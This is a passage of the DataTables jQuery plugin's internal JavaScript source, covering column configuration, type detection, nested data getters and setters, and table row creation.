	 *  @memberof DataTable#oApi

	 */

	function _fnReduce ( that, fn, init, start, end, inc )

	{

		var

			i = start,

			value,

			isSet = false;

	

		if ( init !== undefined ) {

			value = init;

			isSet = true;

		}

	

		while ( i !== end ) {

			if ( ! that.hasOwnProperty(i) ) {

				continue;

			}

	

			value = isSet ?

				fn( value, that[i], i, that ) :

				that[i];

	

			isSet = true;

			i += inc;

		}

	

		return value;

	}

	

	/**

	 * Add a column to the list used for the table with default values

	 *  @param {object} oSettings dataTables settings object

	 *  @param {node} nTh The th element for this column

	 *  @memberof DataTable#oApi

	 */

	function _fnAddColumn( oSettings, nTh )

	{

		// Add column to aoColumns array

		var oDefaults = DataTable.defaults.column;

		var iCol = oSettings.aoColumns.length;

		var oCol = $.extend( {}, DataTable.models.oColumn, oDefaults, {

			"nTh": nTh ? nTh : document.createElement('th'),

			"sTitle":    oDefaults.sTitle    ? oDefaults.sTitle    : nTh ? nTh.innerHTML : '',

			"aDataSort": oDefaults.aDataSort ? oDefaults.aDataSort : [iCol],

			"mData": oDefaults.mData ? oDefaults.mData : iCol,

			idx: iCol

		} );

		oSettings.aoColumns.push( oCol );

	

		// Add search object for column specific search. Note that the `searchCols[ iCol ]`

		// passed into extend can be undefined. This allows the user to give a default

		// with only some of the parameters defined, and also not give a default

		var searchCols = oSettings.aoPreSearchCols;

		searchCols[ iCol ] = $.extend( {}, DataTable.models.oSearch, searchCols[ iCol ] );

	

		// Use the default column options function to initialise classes etc

		_fnColumnOptions( oSettings, iCol, $(nTh).data() );

	}

	

	

	/**

	 * Apply options for a column

	 *  @param {object} oSettings dataTables settings object

	 *  @param {int} iCol column index to consider

	 *  @param {object} oOptions object with sType, bVisible and bSearchable etc

	 *  @memberof DataTable#oApi

	 */

	function _fnColumnOptions( oSettings, iCol, oOptions )

	{

		var oCol = oSettings.aoColumns[ iCol ];

		var oClasses = oSettings.oClasses;

		var th = $(oCol.nTh);

	

		// Try to get width information from the DOM. We can't get it from CSS

		// as we'd need to parse the CSS stylesheet. `width` option can override

		if ( ! oCol.sWidthOrig ) {

			// Width attribute

			oCol.sWidthOrig = th.attr('width') || null;

	

			// Style attribute

			var t = (th.attr('style') || '').match(/width:\s*(\d+[pxem%]+)/);

			if ( t ) {

				oCol.sWidthOrig = t[1];

			}

		}

	

		/* User specified column options */

		if ( oOptions !== undefined && oOptions !== null )

		{

			// Backwards compatibility

			_fnCompatCols( oOptions );

	

			// Map camel case parameters to their Hungarian counterparts

			_fnCamelToHungarian( DataTable.defaults.column, oOptions, true );

	

			/* Backwards compatibility for mDataProp */

			if ( oOptions.mDataProp !== undefined && !oOptions.mData )

			{

				oOptions.mData = oOptions.mDataProp;

			}

	

			if ( oOptions.sType )

			{

				oCol._sManualType = oOptions.sType;

			}

	

			// `class` is a reserved word in Javascript, so we need to provide

			// the ability to use a valid name for the camel case input

			if ( oOptions.className && ! oOptions.sClass )

			{

				oOptions.sClass = oOptions.className;

			}

			if ( oOptions.sClass ) {

				th.addClass( oOptions.sClass );

			}

	

			$.extend( oCol, oOptions );

			_fnMap( oCol, oOptions, "sWidth", "sWidthOrig" );

	

			/* iDataSort to be applied (backwards compatibility), but aDataSort will take

			 * priority if defined

			 */

			if ( oOptions.iDataSort !== undefined )

			{

				oCol.aDataSort = [ oOptions.iDataSort ];

			}

			_fnMap( oCol, oOptions, "aDataSort" );

		}

	

		/* Cache the data get and set functions for speed */

		var mDataSrc = oCol.mData;

		var mData = _fnGetObjectDataFn( mDataSrc );

		var mRender = oCol.mRender ? _fnGetObjectDataFn( oCol.mRender ) : null;

	

		var attrTest = function( src ) {

			return typeof src === 'string' && src.indexOf('@') !== -1;

		};

		oCol._bAttrSrc = $.isPlainObject( mDataSrc ) && (

			attrTest(mDataSrc.sort) || attrTest(mDataSrc.type) || attrTest(mDataSrc.filter)

		);

		oCol._setter = null;

	

		oCol.fnGetData = function (rowData, type, meta) {

			var innerData = mData( rowData, type, undefined, meta );

	

			return mRender && type ?

				mRender( innerData, type, rowData, meta ) :

				innerData;

		};

		oCol.fnSetData = function ( rowData, val, meta ) {

			return _fnSetObjectDataFn( mDataSrc )( rowData, val, meta );

		};

	

		// Indicate if DataTables should read DOM data as an object or array

		// Used in _fnGetRowElements

		if ( typeof mDataSrc !== 'number' ) {

			oSettings._rowReadObject = true;

		}

	

		/* Feature sorting overrides column specific when off */

		if ( !oSettings.oFeatures.bSort )

		{

			oCol.bSortable = false;

			th.addClass( oClasses.sSortableNone ); // Have to add class here as order event isn't called

		}

	

		/* Check that the class assignment is correct for sorting */

		var bAsc = $.inArray('asc', oCol.asSorting) !== -1;

		var bDesc = $.inArray('desc', oCol.asSorting) !== -1;

		if ( !oCol.bSortable || (!bAsc && !bDesc) )

		{

			oCol.sSortingClass = oClasses.sSortableNone;

			oCol.sSortingClassJUI = "";

		}

		else if ( bAsc && !bDesc )

		{

			oCol.sSortingClass = oClasses.sSortableAsc;

			oCol.sSortingClassJUI = oClasses.sSortJUIAscAllowed;

		}

		else if ( !bAsc && bDesc )

		{

			oCol.sSortingClass = oClasses.sSortableDesc;

			oCol.sSortingClassJUI = oClasses.sSortJUIDescAllowed;

		}

		else

		{

			oCol.sSortingClass = oClasses.sSortable;

			oCol.sSortingClassJUI = oClasses.sSortJUI;

		}

	}

	

	

	/**

	 * Adjust the table column widths for new data. Note: you would probably want to

	 * do a redraw after calling this function!

	 *  @param {object} settings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnAdjustColumnSizing ( settings )

	{

		/* Not interested in doing column width calculation if auto-width is disabled */

		if ( settings.oFeatures.bAutoWidth !== false )

		{

			var columns = settings.aoColumns;

	

			_fnCalculateColumnWidths( settings );

			for ( var i=0 , iLen=columns.length ; i<iLen ; i++ )

			{

				columns[i].nTh.style.width = columns[i].sWidth;

			}

		}

	

		var scroll = settings.oScroll;

		if ( scroll.sY !== '' || scroll.sX !== '')

		{

			_fnScrollDraw( settings );

		}

	

		_fnCallbackFire( settings, null, 'column-sizing', [settings] );

	}

	

	

	/**

	 * Covert the index of a visible column to the index in the data array (take account

	 * of hidden columns)

	 *  @param {object} oSettings dataTables settings object

	 *  @param {int} iMatch Visible column index to lookup

	 *  @returns {int} i the data index

	 *  @memberof DataTable#oApi

	 */

	function _fnVisibleToColumnIndex( oSettings, iMatch )

	{

		var aiVis = _fnGetColumns( oSettings, 'bVisible' );

	

		return typeof aiVis[iMatch] === 'number' ?

			aiVis[iMatch] :

			null;

	}

	

	

	/**

	 * Covert the index of an index in the data array and convert it to the visible

	 *   column index (take account of hidden columns)

	 *  @param {int} iMatch Column index to lookup

	 *  @param {object} oSettings dataTables settings object

	 *  @returns {int} i the data index

	 *  @memberof DataTable#oApi

	 */

	function _fnColumnIndexToVisible( oSettings, iMatch )

	{

		var aiVis = _fnGetColumns( oSettings, 'bVisible' );

		var iPos = $.inArray( iMatch, aiVis );

	

		return iPos !== -1 ? iPos : null;

	}

	

	

	/**

	 * Get the number of visible columns

	 *  @param {object} oSettings dataTables settings object

	 *  @returns {int} i the number of visible columns

	 *  @memberof DataTable#oApi

	 */

	function _fnVisbleColumns( oSettings )

	{

		var vis = 0;

	

		// No reduce in IE8, use a loop for now

		$.each( oSettings.aoColumns, function ( i, col ) {

			if ( col.bVisible && $(col.nTh).css('display') !== 'none' ) {

				vis++;

			}

		} );

	

		return vis;

	}

	

	

	/**

	 * Get an array of column indexes that match a given property

	 *  @param {object} oSettings dataTables settings object

	 *  @param {string} sParam Parameter in aoColumns to look for - typically

	 *    bVisible or bSearchable

	 *  @returns {array} Array of indexes with matched properties

	 *  @memberof DataTable#oApi

	 */

	function _fnGetColumns( oSettings, sParam )

	{

		var a = [];

	

		$.map( oSettings.aoColumns, function(val, i) {

			if ( val[sParam] ) {

				a.push( i );

			}

		} );

	

		return a;

	}

	

	

	/**

	 * Calculate the 'type' of a column

	 *  @param {object} settings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnColumnTypes ( settings )

	{

		var columns = settings.aoColumns;

		var data = settings.aoData;

		var types = DataTable.ext.type.detect;

		var i, ien, j, jen, k, ken;

		var col, cell, detectedType, cache;

	

		// For each column, spin over the 

		for ( i=0, ien=columns.length ; i<ien ; i++ ) {

			col = columns[i];

			cache = [];

	

			if ( ! col.sType && col._sManualType ) {

				col.sType = col._sManualType;

			}

			else if ( ! col.sType ) {

				for ( j=0, jen=types.length ; j<jen ; j++ ) {

					for ( k=0, ken=data.length ; k<ken ; k++ ) {

						// Use a cache array so we only need to get the type data

						// from the formatter once (when using multiple detectors)

						if ( cache[k] === undefined ) {

							cache[k] = _fnGetCellData( settings, k, i, 'type' );

						}

	

						detectedType = types[j]( cache[k], settings );

	

						// If null, then this type can't apply to this column, so

						// rather than testing all cells, break out. There is an

						// exception for the last type which is `html`. We need to

						// scan all rows since it is possible to mix string and HTML

						// types

						if ( ! detectedType && j !== types.length-1 ) {

							break;

						}

	

						// Only a single match is needed for html type since it is

						// bottom of the pile and very similar to string

						if ( detectedType === 'html' ) {

							break;

						}

					}

	

					// Type is valid for all data points in the column - use this

					// type

					if ( detectedType ) {

						col.sType = detectedType;

						break;

					}

				}

	

				// Fall back - if no type was detected, always use string

				if ( ! col.sType ) {

					col.sType = 'string';

				}

			}

		}

	}

	

	

	/**

	 * Take the column definitions and static columns arrays and calculate how

	 * they relate to column indexes. The callback function will then apply the

	 * definition found for a column to a suitable configuration object.

	 *  @param {object} oSettings dataTables settings object

	 *  @param {array} aoColDefs The aoColumnDefs array that is to be applied

	 *  @param {array} aoCols The aoColumns array that defines columns individually

	 *  @param {function} fn Callback function - takes two parameters, the calculated

	 *    column index and the definition for that column.

	 *  @memberof DataTable#oApi

	 */

	function _fnApplyColumnDefs( oSettings, aoColDefs, aoCols, fn )

	{

		var i, iLen, j, jLen, k, kLen, def;

		var columns = oSettings.aoColumns;

	

		// Column definitions with aTargets

		if ( aoColDefs )

		{

			/* Loop over the definitions array - loop in reverse so first instance has priority */

			for ( i=aoColDefs.length-1 ; i>=0 ; i-- )

			{

				def = aoColDefs[i];

	

				/* Each definition can target multiple columns, as it is an array */

				var aTargets = def.targets !== undefined ?

					def.targets :

					def.aTargets;

	

				if ( ! $.isArray( aTargets ) )

				{

					aTargets = [ aTargets ];

				}

	

				for ( j=0, jLen=aTargets.length ; j<jLen ; j++ )

				{

					if ( typeof aTargets[j] === 'number' && aTargets[j] >= 0 )

					{

						/* Add columns that we don't yet know about */

						while( columns.length <= aTargets[j] )

						{

							_fnAddColumn( oSettings );

						}

	

						/* Integer, basic index */

						fn( aTargets[j], def );

					}

					else if ( typeof aTargets[j] === 'number' && aTargets[j] < 0 )

					{

						/* Negative integer, right to left column counting */

						fn( columns.length+aTargets[j], def );

					}

					else if ( typeof aTargets[j] === 'string' )

					{

						/* Class name matching on TH element */

						for ( k=0, kLen=columns.length ; k<kLen ; k++ )

						{

							if ( aTargets[j] == "_all" ||

							     $(columns[k].nTh).hasClass( aTargets[j] ) )

							{

								fn( k, def );

							}

						}

					}

				}

			}

		}

	

		// Statically defined columns array

		if ( aoCols )

		{

			for ( i=0, iLen=aoCols.length ; i<iLen ; i++ )

			{

				fn( i, aoCols[i] );

			}

		}

	}

	

	/**

	 * Add a data array to the table, creating DOM node etc. This is the parallel to

	 * _fnGatherData, but for adding rows from a Javascript source, rather than a

	 * DOM source.

	 *  @param {object} oSettings dataTables settings object

	 *  @param {array} aData data array to be added

	 *  @param {node} [nTr] TR element to add to the table - optional. If not given,

	 *    DataTables will create a row automatically

	 *  @param {array} [anTds] Array of TD|TH elements for the row - must be given

	 *    if nTr is.

	 *  @returns {int} >=0 if successful (index of new aoData entry), -1 if failed

	 *  @memberof DataTable#oApi

	 */

	function _fnAddData ( oSettings, aDataIn, nTr, anTds )

	{

		/* Create the object for storing information about this new row */

		var iRow = oSettings.aoData.length;

		var oData = $.extend( true, {}, DataTable.models.oRow, {

			src: nTr ? 'dom' : 'data',

			idx: iRow

		} );

	

		oData._aData = aDataIn;

		oSettings.aoData.push( oData );

	

		/* Create the cells */

		var nTd, sThisType;

		var columns = oSettings.aoColumns;

	

		// Invalidate the column types as the new data needs to be revalidated

		for ( var i=0, iLen=columns.length ; i<iLen ; i++ )

		{

			columns[i].sType = null;

		}

	

		/* Add to the display array */

		oSettings.aiDisplayMaster.push( iRow );

	

		var id = oSettings.rowIdFn( aDataIn );

		if ( id !== undefined ) {

			oSettings.aIds[ id ] = oData;

		}

	

		/* Create the DOM information, or register it if already present */

		if ( nTr || ! oSettings.oFeatures.bDeferRender )

		{

			_fnCreateTr( oSettings, iRow, nTr, anTds );

		}

	

		return iRow;

	}

	

	

	/**

	 * Add one or more TR elements to the table. Generally we'd expect to

	 * use this for reading data from a DOM sourced table, but it could be

	 * used for an TR element. Note that if a TR is given, it is used (i.e.

	 * it is not cloned).

	 *  @param {object} settings dataTables settings object

	 *  @param {array|node|jQuery} trs The TR element(s) to add to the table

	 *  @returns {array} Array of indexes for the added rows

	 *  @memberof DataTable#oApi

	 */

	function _fnAddTr( settings, trs )

	{

		var row;

	

		// Allow an individual node to be passed in

		if ( ! (trs instanceof $) ) {

			trs = $(trs);

		}

	

		return trs.map( function (i, el) {

			row = _fnGetRowElements( settings, el );

			return _fnAddData( settings, row.data, el, row.cells );

		} );

	}

	

	

	/**

	 * Take a TR element and convert it to an index in aoData

	 *  @param {object} oSettings dataTables settings object

	 *  @param {node} n the TR element to find

	 *  @returns {int} index if the node is found, null if not

	 *  @memberof DataTable#oApi

	 */

	function _fnNodeToDataIndex( oSettings, n )

	{

		return (n._DT_RowIndex!==undefined) ? n._DT_RowIndex : null;

	}

	

	

	/**

	 * Take a TD element and convert it into a column data index (not the visible index)

	 *  @param {object} oSettings dataTables settings object

	 *  @param {int} iRow The row number the TD/TH can be found in

	 *  @param {node} n The TD/TH element to find

	 *  @returns {int} index if the node is found, -1 if not

	 *  @memberof DataTable#oApi

	 */

	function _fnNodeToColumnIndex( oSettings, iRow, n )

	{

		return $.inArray( n, oSettings.aoData[ iRow ].anCells );

	}

	

	

	/**

	 * Get the data for a given cell from the internal cache, taking into account data mapping

	 *  @param {object} settings dataTables settings object

	 *  @param {int} rowIdx aoData row id

	 *  @param {int} colIdx Column index

	 *  @param {string} type data get type ('display', 'type' 'filter' 'sort')

	 *  @returns {*} Cell data

	 *  @memberof DataTable#oApi

	 */

	function _fnGetCellData( settings, rowIdx, colIdx, type )

	{

		var draw           = settings.iDraw;

		var col            = settings.aoColumns[colIdx];

		var rowData        = settings.aoData[rowIdx]._aData;

		var defaultContent = col.sDefaultContent;

		var cellData       = col.fnGetData( rowData, type, {

			settings: settings,

			row:      rowIdx,

			col:      colIdx

		} );

	

		if ( cellData === undefined ) {

			if ( settings.iDrawError != draw && defaultContent === null ) {

				_fnLog( settings, 0, "Requested unknown parameter "+

					(typeof col.mData=='function' ? '{function}' : "'"+col.mData+"'")+

					" for row "+rowIdx+", column "+colIdx, 4 );

				settings.iDrawError = draw;

			}

			return defaultContent;

		}

	

		// When the data source is null and a specific data type is requested (i.e.

		// not the original data), we can use default column data

		if ( (cellData === rowData || cellData === null) && defaultContent !== null && type !== undefined ) {

			cellData = defaultContent;

		}

		else if ( typeof cellData === 'function' ) {

			// If the data source is a function, then we run it and use the return,

			// executing in the scope of the data object (for instances)

			return cellData.call( rowData );

		}

	

		if ( cellData === null && type == 'display' ) {

			return '';

		}

		return cellData;

	}

	

	

	/**

	 * Set the value for a specific cell, into the internal data cache

	 *  @param {object} settings dataTables settings object

	 *  @param {int} rowIdx aoData row id

	 *  @param {int} colIdx Column index

	 *  @param {*} val Value to set

	 *  @memberof DataTable#oApi

	 */

	function _fnSetCellData( settings, rowIdx, colIdx, val )

	{

		var col     = settings.aoColumns[colIdx];

		var rowData = settings.aoData[rowIdx]._aData;

	

		col.fnSetData( rowData, val, {

			settings: settings,

			row:      rowIdx,

			col:      colIdx

		}  );

	}

	

	

	// Private variable that is used to match action syntax in the data property object

	var __reArray = /\[.*?\]$/;

	var __reFn = /\(\)$/;

	

	/**

	 * Split string on periods, taking into account escaped periods

	 * @param  {string} str String to split

	 * @return {array} Split string

	 */

	function _fnSplitObjNotation( str )

	{

		return $.map( str.match(/(\\.|[^\.])+/g) || [''], function ( s ) {

			return s.replace(/\\\./g, '.');

		} );

	}

	

	

	/**

	 * Return a function that can be used to get data from a source object, taking

	 * into account the ability to use nested objects as a source

	 *  @param {string|int|function} mSource The data source for the object

	 *  @returns {function} Data get function

	 *  @memberof DataTable#oApi

	 */

	function _fnGetObjectDataFn( mSource )

	{

		if ( $.isPlainObject( mSource ) )

		{

			/* Build an object of get functions, and wrap them in a single call */

			var o = {};

			$.each( mSource, function (key, val) {

				if ( val ) {

					o[key] = _fnGetObjectDataFn( val );

				}

			} );

	

			return function (data, type, row, meta) {

				var t = o[type] || o._;

				return t !== undefined ?

					t(data, type, row, meta) :

					data;

			};

		}

		else if ( mSource === null )

		{

			/* Give an empty string for rendering / sorting etc */

			return function (data) { // type, row and meta also passed, but not used

				return data;

			};

		}

		else if ( typeof mSource === 'function' )

		{

			return function (data, type, row, meta) {

				return mSource( data, type, row, meta );

			};

		}

		else if ( typeof mSource === 'string' && (mSource.indexOf('.') !== -1 ||

			      mSource.indexOf('[') !== -1 || mSource.indexOf('(') !== -1) )

		{

			/* If there is a . in the source string then the data source is in a

			 * nested object so we loop over the data for each level to get the next

			 * level down. On each loop we test for undefined, and if found immediately

			 * return. This allows entire objects to be missing and sDefaultContent to

			 * be used if defined, rather than throwing an error

			 */

			var fetchData = function (data, type, src) {

				var arrayNotation, funcNotation, out, innerSrc;

	

				if ( src !== "" )

				{

					var a = _fnSplitObjNotation( src );

	

					for ( var i=0, iLen=a.length ; i<iLen ; i++ )

					{

						// Check if we are dealing with special notation

						arrayNotation = a[i].match(__reArray);

						funcNotation = a[i].match(__reFn);

	

						if ( arrayNotation )

						{

							// Array notation

							a[i] = a[i].replace(__reArray, '');

	

							// Condition allows simply [] to be passed in

							if ( a[i] !== "" ) {

								data = data[ a[i] ];

							}

							out = [];

	

							// Get the remainder of the nested object to get

							a.splice( 0, i+1 );

							innerSrc = a.join('.');

	

							// Traverse each entry in the array getting the properties requested

							if ( $.isArray( data ) ) {

								for ( var j=0, jLen=data.length ; j<jLen ; j++ ) {

									out.push( fetchData( data[j], type, innerSrc ) );

								}

							}

	

							// If a string is given in between the array notation indicators, that

							// is used to join the strings together, otherwise an array is returned

							var join = arrayNotation[0].substring(1, arrayNotation[0].length-1);

							data = (join==="") ? out : out.join(join);

	

							// The inner call to fetchData has already traversed through the remainder

							// of the source requested, so we exit from the loop

							break;

						}

						else if ( funcNotation )

						{

							// Function call

							a[i] = a[i].replace(__reFn, '');

							data = data[ a[i] ]();

							continue;

						}

	

						if ( data === null || data[ a[i] ] === undefined )

						{

							return undefined;

						}

						data = data[ a[i] ];

					}

				}

	

				return data;

			};

	

			return function (data, type) { // row and meta also passed, but not used

				return fetchData( data, type, mSource );

			};

		}

		else

		{

			/* Array or flat object mapping */

			return function (data, type) { // row and meta also passed, but not used

				return data[mSource];

			};

		}

	}

	

	

	/**

	 * Return a function that can be used to set data from a source object, taking

	 * into account the ability to use nested objects as a source

	 *  @param {string|int|function} mSource The data source for the object

	 *  @returns {function} Data set function

	 *  @memberof DataTable#oApi

	 */

	function _fnSetObjectDataFn( mSource )

	{

		if ( $.isPlainObject( mSource ) )

		{

			/* Unlike get, only the underscore (global) option is used for for

			 * setting data since we don't know the type here. This is why an object

			 * option is not documented for `mData` (which is read/write), but it is

			 * for `mRender` which is read only.

			 */

			return _fnSetObjectDataFn( mSource._ );

		}

		else if ( mSource === null )

		{

			/* Nothing to do when the data source is null */

			return function () {};

		}

		else if ( typeof mSource === 'function' )

		{

			return function (data, val, meta) {

				mSource( data, 'set', val, meta );

			};

		}

		else if ( typeof mSource === 'string' && (mSource.indexOf('.') !== -1 ||

			      mSource.indexOf('[') !== -1 || mSource.indexOf('(') !== -1) )

		{

			/* Like the get, we need to get data from a nested object */

			var setData = function (data, val, src) {

				var a = _fnSplitObjNotation( src ), b;

				var aLast = a[a.length-1];

				var arrayNotation, funcNotation, o, innerSrc;

	

				for ( var i=0, iLen=a.length-1 ; i<iLen ; i++ )

				{

					// Check if we are dealing with an array notation request

					arrayNotation = a[i].match(__reArray);

					funcNotation = a[i].match(__reFn);

	

					if ( arrayNotation )

					{

						a[i] = a[i].replace(__reArray, '');

						data[ a[i] ] = [];

	

						// Get the remainder of the nested object to set so we can recurse

						b = a.slice();

						b.splice( 0, i+1 );

						innerSrc = b.join('.');

	

						// Traverse each entry in the array setting the properties requested

						if ( $.isArray( val ) )

						{

							for ( var j=0, jLen=val.length ; j<jLen ; j++ )

							{

								o = {};

								setData( o, val[j], innerSrc );

								data[ a[i] ].push( o );

							}

						}

						else

						{

							// We've been asked to save data to an array, but it

							// isn't array data to be saved. Best that can be done

							// is to just save the value.

							data[ a[i] ] = val;

						}

	

						// The inner call to setData has already traversed through the remainder

						// of the source and has set the data, thus we can exit here

						return;

					}

					else if ( funcNotation )

					{

						// Function call

						a[i] = a[i].replace(__reFn, '');

						data = data[ a[i] ]( val );

					}

	

					// If the nested object doesn't currently exist - since we are

					// trying to set the value - create it

					if ( data[ a[i] ] === null || data[ a[i] ] === undefined )

					{

						data[ a[i] ] = {};

					}

					data = data[ a[i] ];

				}

	

				// Last item in the input - i.e, the actual set

				if ( aLast.match(__reFn ) )

				{

					// Function call

					data = data[ aLast.replace(__reFn, '') ]( val );

				}

				else

				{

					// If array notation is used, we just want to strip it and use the property name

					// and assign the value. If it isn't used, then we get the result we want anyway

					data[ aLast.replace(__reArray, '') ] = val;

				}

			};

	

			return function (data, val) { // meta is also passed in, but not used

				return setData( data, val, mSource );

			};

		}

		else

		{

			/* Array or flat object mapping */

			return function (data, val) { // meta is also passed in, but not used

				data[mSource] = val;

			};

		}

	}

	

	

	/**

	 * Return an array with the full table data

	 *  @param {object} oSettings dataTables settings object

	 *  @returns array {array} aData Master data array

	 *  @memberof DataTable#oApi

	 */

	function _fnGetDataMaster ( settings )

	{

		return _pluck( settings.aoData, '_aData' );

	}

	

	

	/**

	 * Nuke the table

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnClearTable( settings )

	{

		settings.aoData.length = 0;

		settings.aiDisplayMaster.length = 0;

		settings.aiDisplay.length = 0;

		settings.aIds = {};

	}

	

	

	 /**

	 * Take an array of integers (index array) and remove a target integer (value - not

	 * the key!)

	 *  @param {array} a Index array to target

	 *  @param {int} iTarget value to find

	 *  @memberof DataTable#oApi

	 */

	function _fnDeleteIndex( a, iTarget, splice )

	{

		var iTargetIndex = -1;

	

		for ( var i=0, iLen=a.length ; i<iLen ; i++ )

		{

			if ( a[i] == iTarget )

			{

				iTargetIndex = i;

			}

			else if ( a[i] > iTarget )

			{

				a[i]--;

			}

		}

	

		if ( iTargetIndex != -1 && splice === undefined )

		{

			a.splice( iTargetIndex, 1 );

		}

	}

	

	

	/**

	 * Mark cached data as invalid such that a re-read of the data will occur when

	 * the cached data is next requested. Also update from the data source object.

	 *

	 * @param {object} settings DataTables settings object

	 * @param {int}    rowIdx   Row index to invalidate

	 * @param {string} [src]    Source to invalidate from: undefined, 'auto', 'dom'

	 *     or 'data'

	 * @param {int}    [colIdx] Column index to invalidate. If undefined the whole

	 *     row will be invalidated

	 * @memberof DataTable#oApi

	 *

	 * @todo For the modularisation of v1.11 this will need to become a callback, so

	 *   the sort and filter methods can subscribe to it. That will required

	 *   initialisation options for sorting, which is why it is not already baked in

	 */

	function _fnInvalidate( settings, rowIdx, src, colIdx )

	{

		var row = settings.aoData[ rowIdx ];

		var i, ien;

		var cellWrite = function ( cell, col ) {

			// This is very frustrating, but in IE if you just write directly

			// to innerHTML, and elements that are overwritten are GC'ed,

			// even if there is a reference to them elsewhere

			while ( cell.childNodes.length ) {

				cell.removeChild( cell.firstChild );

			}

	

			cell.innerHTML = _fnGetCellData( settings, rowIdx, col, 'display' );

		};

	

		// Are we reading last data from DOM or the data object?

		if ( src === 'dom' || ((! src || src === 'auto') && row.src === 'dom') ) {

			// Read the data from the DOM

			row._aData = _fnGetRowElements(

					settings, row, colIdx, colIdx === undefined ? undefined : row._aData

				)

				.data;

		}

		else {

			// Reading from data object, update the DOM

			var cells = row.anCells;

	

			if ( cells ) {

				if ( colIdx !== undefined ) {

					cellWrite( cells[colIdx], colIdx );

				}

				else {

					for ( i=0, ien=cells.length ; i<ien ; i++ ) {

						cellWrite( cells[i], i );

					}

				}

			}

		}

	

		// For both row and cell invalidation, the cached data for sorting and

		// filtering is nulled out

		row._aSortData = null;

		row._aFilterData = null;

	

		// Invalidate the type for a specific column (if given) or all columns since

		// the data might have changed

		var cols = settings.aoColumns;

		if ( colIdx !== undefined ) {

			cols[ colIdx ].sType = null;

		}

		else {

			for ( i=0, ien=cols.length ; i<ien ; i++ ) {

				cols[i].sType = null;

			}

	

			// Update DataTables special `DT_*` attributes for the row

			_fnRowAttributes( settings, row );

		}

	}

	

	

	/**

	 * Build a data source object from an HTML row, reading the contents of the

	 * cells that are in the row.

	 *

	 * @param {object} settings DataTables settings object

	 * @param {node|object} TR element from which to read data or existing row

	 *   object from which to re-read the data from the cells

	 * @param {int} [colIdx] Optional column index

	 * @param {array|object} [d] Data source object. If `colIdx` is given then this

	 *   parameter should also be given and will be used to write the data into.

	 *   Only the column in question will be written

	 * @returns {object} Object with two parameters: `data` the data read, in

	 *   document order, and `cells` and array of nodes (they can be useful to the

	 *   caller, so rather than needing a second traversal to get them, just return

	 *   them from here).

	 * @memberof DataTable#oApi

	 */

	function _fnGetRowElements( settings, row, colIdx, d )

	{

		var

			tds = [],

			td = row.firstChild,

			name, col, o, i=0, contents,

			columns = settings.aoColumns,

			objectRead = settings._rowReadObject;

	

		// Allow the data object to be passed in, or construct

		d = d !== undefined ?

			d :

			objectRead ?

				{} :

				[];

	

		var attr = function ( str, td  ) {

			if ( typeof str === 'string' ) {

				var idx = str.indexOf('@');

	

				if ( idx !== -1 ) {

					var attr = str.substring( idx+1 );

					var setter = _fnSetObjectDataFn( str );

					setter( d, td.getAttribute( attr ) );

				}

			}

		};

	

		// Read data from a cell and store into the data object

		var cellProcess = function ( cell ) {

			if ( colIdx === undefined || colIdx === i ) {

				col = columns[i];

				contents = $.trim(cell.innerHTML);

	

				if ( col && col._bAttrSrc ) {

					var setter = _fnSetObjectDataFn( col.mData._ );

					setter( d, contents );

	

					attr( col.mData.sort, cell );

					attr( col.mData.type, cell );

					attr( col.mData.filter, cell );

				}

				else {

					// Depending on the `data` option for the columns the data can

					// be read to either an object or an array.

					if ( objectRead ) {

						if ( ! col._setter ) {

							// Cache the setter function

							col._setter = _fnSetObjectDataFn( col.mData );

						}

						col._setter( d, contents );

					}

					else {

						d[i] = contents;

					}

				}

			}

	

			i++;

		};

	

		if ( td ) {

			// `tr` element was passed in

			while ( td ) {

				name = td.nodeName.toUpperCase();

	

				if ( name == "TD" || name == "TH" ) {

					cellProcess( td );

					tds.push( td );

				}

	

				td = td.nextSibling;

			}

		}

		else {

			// Existing row object passed in

			tds = row.anCells;

	

			for ( var j=0, jen=tds.length ; j<jen ; j++ ) {

				cellProcess( tds[j] );

			}

		}

	

		// Read the ID from the DOM if present

		var rowNode = row.firstChild ? row : row.nTr;

	

		if ( rowNode ) {

			var id = rowNode.getAttribute( 'id' );

	

			if ( id ) {

				_fnSetObjectDataFn( settings.rowId )( d, id );

			}

		}

	

		return {

			data: d,

			cells: tds

		};

	}

	/**

	 * Create a new TR element (and it's TD children) for a row

	 *  @param {object} oSettings dataTables settings object

	 *  @param {int} iRow Row to consider

	 *  @param {node} [nTrIn] TR element to add to the table - optional. If not given,

	 *    DataTables will create a row automatically

	 *  @param {array} [anTds] Array of TD|TH elements for the row - must be given

	 *    if nTr is.

	 *  @memberof DataTable#oApi

	 */

	function _fnCreateTr ( oSettings, iRow, nTrIn, anTds )

	{

		var

			row = oSettings.aoData[iRow],

			rowData = row._aData,

			cells = [],

			nTr, nTd, oCol,

			i, iLen, create;

	

		if ( row.nTr === null )

		{

			nTr = nTrIn || document.createElement('tr');

	

			row.nTr = nTr;

			row.anCells = cells;

	

			/* Use a private property on the node to allow reserve mapping from the node

			 * to the aoData array for fast look up

			 */

			nTr._DT_RowIndex = iRow;

	

			/* Special parameters can be given by the data source to be used on the row */

			_fnRowAttributes( oSettings, row );

	

			/* Process each column */

			for ( i=0, iLen=oSettings.aoColumns.length ; i<iLen ; i++ )

			{

				oCol = oSettings.aoColumns[i];

				create = nTrIn ? false : true;

	

				nTd = create ? document.createElement( oCol.sCellType ) : anTds[i];

				nTd._DT_CellIndex = {

					row: iRow,

					column: i

				};

				

				cells.push( nTd );

	

				// Need to create the HTML if new, or if a rendering function is defined

				if ( create || ((!nTrIn || oCol.mRender || oCol.mData !== i) &&

					 (!$.isPlainObject(oCol.mData) || oCol.mData._ !== i+'.display')

				)) {

					nTd.innerHTML = _fnGetCellData( oSettings, iRow, i, 'display' );

				}

	

				/* Add user defined class */

				if ( oCol.sClass )

				{

					nTd.className += ' '+oCol.sClass;

				}

	

				// Visibility - add or remove as required

				if ( oCol.bVisible && ! nTrIn )

				{

					nTr.appendChild( nTd );

				}

				else if ( ! oCol.bVisible && nTrIn )

				{

					nTd.parentNode.removeChild( nTd );

				}

	

				if ( oCol.fnCreatedCell )

				{

					oCol.fnCreatedCell.call( oSettings.oInstance,

						nTd, _fnGetCellData( oSettings, iRow, i ), rowData, iRow, i

					);

				}

			}

	

			_fnCallbackFire( oSettings, 'aoRowCreatedCallback', null, [nTr, rowData, iRow, cells] );

		}

	

